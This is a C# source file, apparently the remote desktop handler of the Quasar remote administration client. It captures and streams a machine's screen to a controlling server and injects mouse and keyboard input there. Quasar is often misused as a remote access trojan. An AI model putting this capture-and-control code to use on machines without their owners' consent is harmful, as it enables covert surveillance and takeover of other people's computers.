﻿using Quasar.Client.Helper;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Video;
using Quasar.Common.Video.Codecs;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using Quasar.Common.Messages.Monitoring.RemoteDesktop;
using Quasar.Common.Messages.other;
using System.Collections.Concurrent;

namespace Quasar.Client.Messages
{
    public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
    {
        private UnsafeStreamCodec _streamCodec;
        private BitmapData _desktopData = null;
        private Bitmap _desktop = null;
        private int _displayIndex = 0;
        private ISender _clientMain;
        private Thread _captureThread;
        private CancellationTokenSource _cancellationTokenSource;

        private bool _useGpu = false;

        // frame control variables
        private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
        private readonly AutoResetEvent _frameRequestEvent = new AutoResetEvent(false);
        private int _pendingFrameRequests = 0;

        // max buffer size to prevent memory issues
        private const int MAX_BUFFER_SIZE = 10;

        private readonly Stopwatch _stopwatch = new Stopwatch();
        private int _frameCount = 0;

        public override bool CanExecute(IMessage message) => message is GetDesktop ||
                                                             message is DoMouseEvent ||
                                                             message is DoKeyboardEvent ||
                                                             message is GetMonitors;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetDesktop msg:
                    Execute(sender, msg);
                    break;
                case DoMouseEvent msg:
                    Execute(sender, msg);
                    break;
                case DoKeyboardEvent msg:
                    Execute(sender, msg);
                    break;
                case GetMonitors msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetDesktop message)
        {
            if (message.Status == RemoteDesktopStatus.Stop)
            {
                StopScreenStreaming();
            }
            else if (message.Status == RemoteDesktopStatus.Start)
            {
                StartScreenStreaming(client, message);
            }
            else if (message.Status == RemoteDesktopStatus.Continue)
            {
                // server is requesting more frames
                Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
                _frameRequestEvent.Set();

                Debug.WriteLine($"Server requested {message.FramesRequested} more frames. Total pending: {_pendingFrameRequests}");
            }
        }

        private void StartScreenStreaming(ISender client, GetDesktop message)
        {
            Debug.WriteLine("Starting remote desktop session");

            _useGpu = message.UseGPU;

            var monitorBounds = ScreenHelperCPU.GetBounds(message.DisplayIndex);
            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };

            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            if (message.CreateNew)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
                OnReport("Remote desktop session started");
            }

            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            _displayIndex = message.DisplayIndex;
            _clientMain = client;

            // clear any pending frame requests and existing frames
            ClearFrameBuffer();
            Interlocked.Exchange(ref _pendingFrameRequests, message.FramesRequested);

            if (_captureThread == null || !_captureThread.IsAlive)
            {
                _cancellationTokenSource = new CancellationTokenSource();
                _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token));
                _captureThread.Start();
            }
        }

        private void StopScreenStreaming()
        {
            Debug.WriteLine("Stopping remote desktop session");

            _cancellationTokenSource?.Cancel();

            if (_captureThread != null && _captureThread.IsAlive)
            {
                _frameRequestEvent.Set(); // wake up thread
                _captureThread.Join();
                _captureThread = null;
            }

            if (_desktop != null)
            {
                if (_desktopData != null)
                {
                    try
                    {
                        _desktop.UnlockBits(_desktopData);
                    }
                    catch
                    {
                    }
                    _desktopData = null;
                }
                _desktop.Dispose();
                _desktop = null;
            }

            if (_streamCodec != null)
            {
                _streamCodec.Dispose();
                _streamCodec = null;
            }

            // clear the buff
            ClearFrameBuffer();
            Interlocked.Exchange(ref _pendingFrameRequests, 0);
        }

        private void BufferedCaptureLoop(CancellationToken cancellationToken)
        {
            Debug.WriteLine("Starting buffered capture loop");
            _stopwatch.Start();

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // wait for frame requests if the buffer is full or no frames are requested
                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE || _pendingFrameRequests <= 0)
                    {
                        Debug.WriteLine($"Waiting for frame requests. Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
                        _frameRequestEvent.WaitOne(500);

                        // if cancellation was requested during the wait
                        if (cancellationToken.IsCancellationRequested)
                            break;

                        continue;
                    }

                    // capture frame and add to buffer
                    byte[] frameData = CaptureFrame();
                    if (frameData != null)
                    {
                        _frameBuffer.Enqueue(frameData);

                        // increment frame counter for statistics
                        _frameCount++;
                        if (_stopwatch.ElapsedMilliseconds >= 1000)
                        {
                            Debug.WriteLine($"Capture FPS: {_frameCount}, Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
                            _frameCount = 0;
                            _stopwatch.Restart();
                        }
                    }

                    // send frames if we have pending requests
                    while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out byte[] frameToSend))
                    {
                        SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error in buffered capture loop: {ex.Message}");
                    Thread.Sleep(100); // Avoid tight loop in case of repeated errors
                }
            }

            Debug.WriteLine("Buffered capture loop ended");
        }

        private byte[] CaptureFrame()
        {
            try
            {
                _desktop = ScreenHelperCPU.CaptureScreen(_displayIndex);

                if (_desktop == null)
                {
                    Debug.WriteLine("Error capturing screen: Bitmap is null");
                    return null;
                }

                _desktopData = _desktop.LockBits(new Rectangle(0, 0, _desktop.Width, _desktop.Height),
                    ImageLockMode.ReadWrite, _desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                    _streamCodec.CodeImage(_desktopData.Scan0,
                        new Rectangle(0, 0, _desktop.Width, _desktop.Height),
                        new Size(_desktop.Width, _desktop.Height),
                        _desktop.PixelFormat, stream);

                    return stream.ToArray();
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error capturing frame: {ex.Message}");
                return null;
            }
            finally
            {
                if (_desktopData != null)
                {
                    _desktop.UnlockBits(_desktopData);
                    _desktopData = null;
                }
                _desktop?.Dispose();
                _desktop = null;
            }
        }

        private void SendFrameToServer(byte[] frameData, bool isLastRequestedFrame)
        {
            if (frameData == null || _clientMain == null) return;

            try
            {
                _clientMain.Send(new GetDesktopResponse
                {
                    Image = frameData,
                    Quality = _streamCodec.ImageQuality,
                    Monitor = _streamCodec.Monitor,
                    Resolution = _streamCodec.Resolution,
                    Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                    IsLastRequestedFrame = isLastRequestedFrame
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error sending frame to server: {ex.Message}");
            }
        }

        private void ClearFrameBuffer()
        {
            while (_frameBuffer.TryDequeue(out _)) { }
        }

        private void Execute(ISender sender, DoMouseEvent message)
        {
            try
            {
                Screen[] allScreens = Screen.AllScreens;
                int offsetX = allScreens[message.MonitorIndex].Bounds.X;
                int offsetY = allScreens[message.MonitorIndex].Bounds.Y;
                Point p = new Point(message.X + offsetX, message.Y + offsetY);

                // Disable screensaver if active before input
                if (NativeMethodsHelper.IsScreensaverActive())
                    NativeMethodsHelper.DisableScreensaver();

                switch (message.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                        NativeMethodsHelper.DoMouseLeftClick(p, message.IsMouseDown);
                        break;
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                        NativeMethodsHelper.DoMouseRightClick(p, message.IsMouseDown);
                        break;
                    case MouseAction.MoveCursor:
                        NativeMethodsHelper.DoMouseMove(p);
                        break;
                    case MouseAction.ScrollDown:
                        NativeMethodsHelper.DoMouseScroll(p, true);
                        break;
                    case MouseAction.ScrollUp:
                        NativeMethodsHelper.DoMouseScroll(p, false);
                        break;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error executing mouse event: {ex.Message}");
            }
        }

        private void Execute(ISender sender, DoKeyboardEvent message)
        {
            try
            {
                if (NativeMethodsHelper.IsScreensaverActive())
                    NativeMethodsHelper.DisableScreensaver();

                NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error executing keyboard event: {ex.Message}");
            }
        }

        private void Execute(ISender client, GetMonitors message)
        {
            int screenCountTotal = DisplayManager.GetDisplayCount();

            Debug.WriteLine(screenCountTotal);

            client.Send(new GetMonitorsResponse { Number = screenCountTotal });
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
            StopScreenStreaming();
            _streamCodec?.Dispose();
            _cancellationTokenSource?.Dispose();
            _frameRequestEvent?.Dispose();
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                StopScreenStreaming();
                _streamCodec?.Dispose();
                _cancellationTokenSource?.Dispose();
                _frameRequestEvent?.Dispose();
            }
        }
    }
}